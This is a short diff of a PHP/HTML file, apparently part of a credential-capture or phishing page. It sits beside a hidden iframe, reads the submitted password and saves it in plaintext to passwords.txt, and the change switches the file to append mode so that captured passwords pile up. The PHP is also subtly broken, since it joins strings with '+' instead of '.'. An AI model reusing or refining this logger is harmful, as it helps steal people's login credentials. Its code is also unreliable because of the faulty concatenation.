@@ -10,7 +10,7 @@
       <iframe name="secret_iframe" style="display: none;"></iframe>
       <?php
         $password = $_POST["password"];
-        $pw_log = fopen("passwords.txt", "w");
+        $pw_log = fopen("passwords.txt", "a");
         fwrite($pw_log, $password + PHP_EOL);
         fclose($pw_log);
       ?>
